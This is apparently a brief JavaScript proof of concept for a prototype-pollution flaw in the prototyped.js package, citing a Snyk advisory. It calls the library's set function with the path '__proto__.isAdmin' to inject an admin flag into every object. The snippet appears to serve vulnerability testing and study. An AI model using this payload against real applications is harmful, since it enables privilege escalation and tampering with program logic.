// //https://snyk.io/vuln/SNYK-JS-PROTOTYPEDJS-1069824

console.log({}.polluted);

  // merge({}, JSON.parse(malicious_payload));

console.log({}.polluted);

  const set = require("prototyped.js/dist/object/set").default;
//   console.log("Prototype before set", {}.polluted);
  set({}, "__proto__.isAdmin", true);
//   console.log("Prototype after set", {}.polluted);
